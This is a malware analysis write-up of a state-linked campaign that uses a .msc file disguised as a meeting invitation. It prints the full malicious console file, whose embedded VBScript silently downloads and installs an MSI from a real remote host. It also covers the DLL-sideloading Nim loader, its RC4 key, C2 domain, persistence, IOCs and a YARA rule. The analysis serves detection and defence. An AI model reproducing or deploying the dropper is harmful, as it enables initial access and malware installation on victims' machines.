sample: https://github.com/StrikeReady-Inc/samples/tree/main/2024-08-01%20Meeting%20invitation

The main sample is a .msc file impersonating a meeting invitation document.
```
<MMC_ConsoleFile ConsoleVersion="3.0" ProgramMode="UserSDI">
    <ConsoleFileID>a7bf8102-12e1-4226-aa6a-2ba71f6249d0</ConsoleFileID>
    <FrameState ShowStatusBar="false">
        <WindowPlacement ShowCommand="SW_HIDE">
            <Point Name="MinPosition" X="-1" Y="-1" />
            <Point Name="MaxPosition" X="-1" Y="-1" />
            <Rectangle Name="NormalPosition" Top="0" Bottom="0" Left="0" Right="0" />
        </WindowPlacement>
    </FrameState>
    <Views>
        <View ID="1" ScopePaneWidth="0" ActionsPaneWidth="-1">
            <BookMark Name="RootNode" NodeID="1" />
            <BookMark Name="SelectedNode" NodeID="13" />
            <WindowPlacement WPF_RESTORETOMAXIMIZED="true" ShowCommand="SW_HIDE">
                <Point Name="MinPosition" X="-1" Y="-1" />
                <Point Name="MaxPosition" X="-8" Y="-31" />
                <Rectangle Name="NormalPosition" Top="0" Bottom="0" Left="0" Right="0" />
            </WindowPlacement>
            <ViewOptions ViewMode="Report" ScopePaneVisible="true" ActionsPaneVisible="false" DescriptionBarVisible="false" DefaultColumn0Width="200" DefaultColumn1Width="0" />
        </View>
    </Views>
    <VisualAttributes>
        <Icon Index="85" File="%windir%\System32\imageres.dll">
            <Image Name="Large" BinaryRefIndex="2" />
            <Image Name="Small" BinaryRefIndex="3" />
            <Image Name="Large48x" BinaryRefIndex="4" />
        </Icon>
    </VisualAttributes>
    <Favorites>
        <Favorite TYPE="Group">
            <String Name="Name" ID="1" />
            <Favorites />
        </Favorite>
    </Favorites>
    <ScopeTree>
        <SnapinCache>
            <Snapin CLSID="{C96401CC-0E17-11D3-885B-00C04F72C717}" AllExtensionsEnabled="true" />
            <Snapin CLSID="{C96401CF-0E17-11D3-885B-00C04F72C717}" AllExtensionsEnabled="true" />
            <Snapin CLSID="{C96401D1-0E17-11D3-885B-00C04F72C717}" AllExtensionsEnabled="true" />
        </SnapinCache>
        <Nodes>
            <Node ID="1" ImageIdx="0" CLSID="{C96401CC-0E17-11D3-885B-00C04F72C717}" Preload="true">
                <Nodes>
                    <Node ID="13" ImageIdx="0" CLSID="{C96401D1-0E17-11D3-885B-00C04F72C717}" Preload="true">
                        <Nodes />
                        <String Name="Name" ID="38" />
                        <ComponentDatas>
                            <ComponentData>
                                <GUID Name="Snapin">{C96401D1-0E17-11D3-885B-00C04F72C717}</GUID>
                                <Stream BinaryRefIndex="0" />
                            </ComponentData>
                        </ComponentDatas>
                        <Components />
                    </Node>
                    <Node ID="9" ImageIdx="0" CLSID="{C96401CF-0E17-11D3-885B-00C04F72C717}" Preload="true">
                        <Nodes />
                        <String Name="Name" ID="23" />
                        <ComponentDatas>
                            <ComponentData>
                                <GUID Name="Snapin">{C96401CF-0E17-11D3-885B-00C04F72C717}</GUID>
                                <Stream BinaryRefIndex="1" />
                            </ComponentData>
                        </ComponentDatas>
                        <Components>
                            <Component ViewID="1">
                                <GUID Name="Snapin">{C96401CF-0E17-11D3-885B-00C04F72C717}</GUID>
                            </Component>
                        </Components>
                    </Node>
                </Nodes>
                <String Name="Name" ID="8" />
                <ComponentDatas>
                    <ComponentData>
                        <GUID Name="Snapin">{C96401CC-0E17-11D3-885B-00C04F72C717}</GUID>
                    </ComponentData>
                </ComponentDatas>
                <Components />
            </Node>
        </Nodes>
    </ScopeTree>
    <ConsoleTaskpads />
    <ViewSettingsCache />
    <ColumnSettingsCache />
    <StringTables>
        <IdentifierPool AbsoluteMin="1" AbsoluteMax="65535" NextAvailable="40" />
        <StringTable>
            <GUID>{71E5B33E-1064-11D2-808F-0000F875A9CE}</GUID>
            <Strings>
                <String ID="1" Refs="1">Favorites</String>
                <String ID="8" Refs="2">// Console Root
          var uxuuFZSNY = external.Document.ScopeNamespace;
          var DHLxiYo = uxuuFZSNY.GetRoot()
          var FucocF = uxuuFZSNY.GetChild(DHLxiYo)
          var SpTXWJC = uxuuFZSNY.GetNext(FucocF)

          external.Document.ActiveView.ActiveScopeNode = SpTXWJC
          VFqMpYvzGFOM = external.Document.ActiveView.ControlObject
          external.Document.ActiveView.ActiveScopeNode = FucocF

          var aLVdPlfW = VFqMpYvzGFOM;
          aLVdPlfW.async = false
          var NTaqcK = aLVdPlfW;

          NTaqcK.loadXML(unescape("%3C%3Fxml%20version%3D%271.0%27%3F%3E%0A%3Cstylesheet%0Axmlns%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%20xmlns%3Ams%3D%22urn%3Aschemas-microsoft-com%3Axslt%22%0Axmlns%3Auser%3D%22placeholder%22%0Aversion%3D%221.0%22%3E%0A%3Coutput%20method%3D%22text%22%2F%3E%0A%3Cms%3Ascript%20implements-prefix%3D%22user%22%20language%3D%22VBScript%22%3E%0A%3C%21%5BCDATA%5B%0Aon%20error%20resume%20next%0ASet%20wshshell%20%3D%20CreateObject%28%22WindowsInstaller.Installer%22%29%0Awshshell.uilevel%3D2%0Awshshell.installproduct%20%22https%3A%2F%2Fcdn7s65.z13.web.core.windows.net%2Fver.dat%22%2C%22REMOVE%3DALL%22%0Awshshell.installproduct%28%22https%3A%2F%2Fcdn7s65.z13.web.core.windows.net%2Fver.dat%22%29%0A%5D%5D%3E%3C%2Fms%3Ascript%3E%0A%3C%2Fstylesheet%3E"))
          aLVdPlfW.transformNode(NTaqcK)
        </String>
                <String ID="23" Refs="2">Document</String>
                <String ID="24" Refs="1">{2933BF90-7B36-11D2-B20E-00C04F983E60}</String>
                <String ID="38" Refs="2">Main</String>
                <String ID="39" Refs="1">res://apd
                s.dll/redirect.html?target=jav
                ascript:eval((((external.Document.ScopeName
                space.GetRoot().Name))))</String>
            </Strings>
        </StringTable>
    </StringTables>
    <BinaryStorage>
        <Binary>AQAAABQAAAAAAAAAJgAAACcAAAA=</Binary>
        <Binary>AQAAABQAAAAAAAAAFwAAABgAAAA=</Binary>
        <Binary Name="CONSOLE_FILE_ICON_LARGE">SUwBAQEABAAEACAAIAD/////IQD//////////0JNNgAAAAAAAA...
AAAAAAA+AAB/wAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAA    </Binary>
        <Binary Name="CONSOLE_FILE_ICON_SMALL">SUwBAQEABAAEABAAEAD/////IQD//////////0JNNgAAAAAAAA...
ADAAwAAAAAAAMAHAAAAAAAA</Binary>
        <Binary Name="CONSOLE_FILE_ICON_LARGE48x">SUwBAQEABAAEADAAMAD/////IQD//////////0JNNgAAAAA...
AAAAAAA////////AAAAAAAAAAAAAAAAAAAAAAAA////////AAAAAAAAAAAAAAAAAAAAAAAA    </Binary>
    </BinaryStorage>
</MMC_ConsoleFile>
```

An url encoded xml string can be extracted from the msc file. It contains a VBA script which downloads and executes a MSI installer.

```
emit "Meeting invitation.msc" | carve string -s | url
"<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="VBScript">
<![CDATA[
on error resume next
Set wshshell = CreateObject("WindowsInstaller.Installer")
wshshell.uilevel=2
wshshell.installproduct "https://cdn7s65.z13.web.core.windows.net/ver.dat","REMOVE=ALL"
wshshell.installproduct("https://cdn7s65.z13.web.core.windows.net/ver.dat")
]]></ms:script>
</stylesheet>"
```
Contents of the downloaded MSI installer are one CAB archive and multiple MSI tables.
```
emit ver.dat | xtmsi -l
CHROskYaKLM.cab
MsiTables.json
MsiTables/AdminExecuteSequence.csv
MsiTables/AdminUISequence.csv
MsiTables/AdvtExecuteSequence.csv
MsiTables/Component.csv
MsiTables/CustomAction.csv
MsiTables/Directory.csv
MsiTables/Feature.csv
MsiTables/FeatureComponents.csv
MsiTables/File.csv
MsiTables/InstallExecuteSequence.csv
MsiTables/InstallUISequence.csv
MsiTables/Media.csv
MsiTables/MsiFileHash.csv
MsiTables/Property.csv
MsiTables/RemoveFile.csv
MsiTables/Validation.csv
```
3 files can be extracted from the CAB archive `CHROskYaKLM.cab` - an EXE, a DLL and an encrypted file:
```
ef ** [| peek -mml1 ]
    crc32 = 9bb9fabb
  entropy = 99.99%
    magic = data
     path = ihItRPL
   sha256 = 37c7bdac64e279dc421de8f8a364db1e9fd1dcca3a6c1d33df890c1da7573e9f
     size = 00.689 MB
00000: B6 1E 6F E4 CC 80 67 FE 17 98 E7 80 8F D3 B5 CA F2 97 25 CF B2 00 B6 62 7F 91 E6 99 C2 CB CC 8F 36 78 CC 99 07 AB 39 D6 2A 05 67 92 6D 94 BF 36 D7 1D 9D B6 49 B9 B5 AC 38  ..o...g...........%....b........6x....9.*.g.m..6....I...8

    crc32 = 0e193a8b
  entropy = 74.25%
    magic = PE32 executable (DLL) (console) Intel 80386, for MS Windows
     path = LiPifemwQsa
   sha256 = 1a37289c70c78697b85937ae4e1e8a4cebb7972c731aceaef2813e241217f009
     size = 00.266 MB
00000: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  MZ......................@................................

    crc32 = aaaa48a7
  entropy = 75.16%
    magic = PE32 executable (GUI) Intel 80386, for MS Windows
     path = wiBqETobmg
   sha256 = 282fc12e4f36b6e2558f5dd33320385f41e72d3a90d0d3777a31ef1ba40722d6
     size = 01.775 MB
000000000: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  MZ......................@...............................
```

From the MSI table schema more information about the files can be recovered:
```
 "File": [
        {
            "File": "wiBqETobmg",
            "Component_": "wiBqETobmg",
            "FileName": "rfmyqt8f.exe|LDeviceDetectionHelper.exe",
            "FileSize": 1775384,
            "Version": "1.0.11.0",
            "Language": "1033",
            "Attributes": 512,
            "Sequence": 3
        },
        {
            "File": "LiPifemwQsa",
            "Component_": "LiPifemwQsa",
            "FileName": "hid.dll",
            "FileSize": 266266,
            "Version": "",
            "Language": "",
            "Attributes": 512,
            "Sequence": 2
        },
        {
            "File": "ihItRPL",
            "Component_": "ihItRPL",
            "FileName": "LDevice.dat",
            "FileSize": 689342,
            "Version": "",
            "Language": "",
            "Attributes": 512,
            "Sequence": 1
        }
    ],
```
Looking at component tables extracted from the MSI database:
```
  path = MsiTables/CustomAction.csv
Action,Type,Source,Target,ExtendedType,Comment
SetOblsaYFUJOqn,51,OblsaYFUJOqn,[%LOCALAPPDATA]\FRKBrMZCk,0,Property set with formatted text.
WwcsIyN,2274,TARGETDIR,[%LOCALAPPDATA]\FRKBrMZCk\LDeviceDetectionHelper.exe,0,EXE file having a path referencing a directory.
```
Files are dropped to `%LOCALAPPDATA%\FRKBrMZCk` and `LDeviceDetectionHelper.exe` is executed.

Searching for the file hashes on virustotal I found a report by Recorded Future. https://www.recordedfuture.com/research/reddelta-chinese-state-sponsored-group-targets-mongolia-taiwan-southeast-asia

Based on VT detections, file certificates, and the report, LDeviceDetectionHelper.exe is probably a benign application that is being used to load hid.dll with dll search order hijacking.

## Stage 2 - malicious dll analysis (nim loader)

hid.dll is written in nim. It exports HidD_GetHidGuid which gets called by LDeviceDetectionHelper.exe. 

The function allocates on the stack 2 objects: tagWNDCLASSA and tagMSG. It sets the lpfnWndProc field of tagWNDCLASSA to another function and calls RegisterClassW.

![../attachments/Pasted-image-20250128175619.png](/attachments/Pasted-image-20250128175619.png)

Names of user defined functions are obfuscated. Api's are resolved dynamically using an api hashing algorithm that can be reconstructed in python:
```
def hash(data):
    result = 0xc0de1337
    ebx = 0

    for char in data:
        char_value = ord(char)
        eax_5 = (result << 0x18) | ((result & 0xFFFFFFFF) >> 8) | (ebx << 0x18)
        result ^= (eax_5 + char_value) & 0xFFFFFFFF
        ebx ^= ((eax_5 + char_value) < eax_5)
```

![../attachments/Pasted-image-20250128175514.png](/attachments/Pasted-image-20250128175514.png)]

 lpfnWndProc is a pointer to a window procedure, which is a callback function that processes all messages sent to windows of the class. This allows the malware to indirectly call the function that spawns a thread which runs another function.
 ![../attachments/Pasted-image-20250128175718.png](/attachments/Pasted-image-20250128175718.png)

It's purpose is to read the encrypted file `LDevice.dat` and decrypt it with RC4 using a key hardcoded in the sample: `BhaPKNSALeXZBJYz`.

The in-memory decrypted file is then used as EnumGeoInfoProc callback function for EnumSystemGeoID. The start of the file data gets passed as the callback. It is both a valid MZ header and code.

![../attachments/Pasted-image-20250128181235.png](/attachments/Pasted-image-20250128181235.png)

The decrypted code:
![../attachments/Pasted-image-20250128060128.png](/attachments/Pasted-image-20250128060128.png)

The execution then gets passed to a large virtualized function which is also the only export of the decrypted program and is named Initialize. Further analysis was mostly dynamic because of the advanced obfuscation.

The program opens a PDF document `%LOCALAPPDATA%/Temp/Meeting Invitation.pdf` containing a generic meeting invitation. From the language and usage of EDT timezone, this attack is probably targeted at employees in the US or Canada.

![../attachments/Pasted-image-20250128124501.png](/attachments/Pasted-image-20250128124501.png)

Analyzing the obfuscated program dynamically, it resolves APIs using LoadLibrary and GetProcAddress and allocates memory using VirtualAlloc for what seems to be another stage of the attack. The next stage uses encrypted stack strings, control flow obfuscation.

Observing the sandbox traffic in wireshark, the malware resolves a suspicious domain: `conflictaslesson.com`

The domain resolves to IPs belonging to Cloudflare Reverse Proxy:
```
104.21.112.1
104.21.16.1
104.21.32.1
104.21.48.1
104.21.64.1
104.21.80.1
104.21.96.1
```

The exe and dll files are copied to:
`C:\ProgramData\Intelnet\`

Persistence is achieved using registry keys:
```
  "Key": "\\REGISTRY\\USER\\S-1-5-21-4185212690-3466370234-498877696-500\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN",
  "ValueName": "SetPoint Update",
  "Value": "\"C:\\ProgramData\\Intelnet\\LDeviceDetectionHelper.exe\" 74",

```


All IOCs:

Malicious files (sha256):
```
Meeting inivitation.msc
CA0DFDA9A329F5729B3CA07C6578B3B6560E7CFAEFF8D988D1FE8C9CA6896DA5

LiPifemwQsa / hid.dll
1A37289C70C78697B85937AE4E1E8A4CEBB7972C731ACEAEF2813E241217F009

ihItRPL / LDevice.dat
37C7BDAC64E279DC421DE8F8A364DB1E9FD1DCCA3A6C1D33DF890C1DA7573E9F
```

Legitimate executable used in the attack(sha256):
```
wiBqETobmg / LDeviceDetectionHelper.exe
282FC12E4F36B6E2558F5DD33320385F41E72D3A90D0D3777A31EF1BA40722D6
```

File paths:
`%LOCALAPPDATA%\FRKBrMZCk`

Domains and IPs:
```
hxxps://cdn7s65.z13.web.core.windows[.]net/ver.dat
conflictaslesson[.]com
104.21.112.1
104.21.16.1
104.21.32.1
104.21.48.1
104.21.64.1
104.21.80.1
104.21.96.1
```

The Recorded Future analysis contains a yara rule to detect the nim loader based on the  rc4 implementation. I wrote another yara rule for api hashing routine:
```
rule RedDelta_api_hashing
{
    meta:
        description = "Detects api hashing used by RedDelta nim loader"
        author = "Paweł Sołowiej"
        date = "2025-01-28"
		sha256 = "1A37289C70C78697B85937AE4E1E8A4CEBB7972C731ACEAEF2813E241217F0091"

    strings:
        $code = {
            B9 ?? ?? ?? ??        // mov ecx, 0x???????? 
            8B 45 ??              // mov eax, dword ptr [ebp - 0x??]
            8B 55 ??              // mov edx, dword ptr [ebp - 0x??]
            8A 04 10              // mov al, byte ptr [eax + edx]
            88 45 ??              // mov byte ptr [ebp - 0x??], al
            84 C0                 // test al, al
			74 ??                 // je
            89 C8                 // mov eax, ecx
            31 D2                 // xor edx, edx
            0F AC D8 08           // shrd eax, ebx, 8
            89 D7                 // mov edi, edx
            89 C6                 // mov esi, eax
			89 C8                 // mov eax, ecx
            C1 E0 18              // shl eax, 0x18
            09 F0                 // or eax, esi
			89 C6                 // mov esi eax
            0F B6 45 ??           // movzx eax, byte ptr [ebp - 0x??]
            01 C6                 // add esi, eax
            83 D7 00              // adc edi, 0
            31 F1                 // xor ecx, esi
            8B 75 ??              // mov esi, dword ptr [ebp - 0x??]
            31 FB                 // xor ebx, edi
            83 C6 01              // add esi, 1
            89 75 ??              // mov dword ptr [ebp - 0x??], esi
            71 ??                 // jno 
        }

    condition:
        $code
}

```


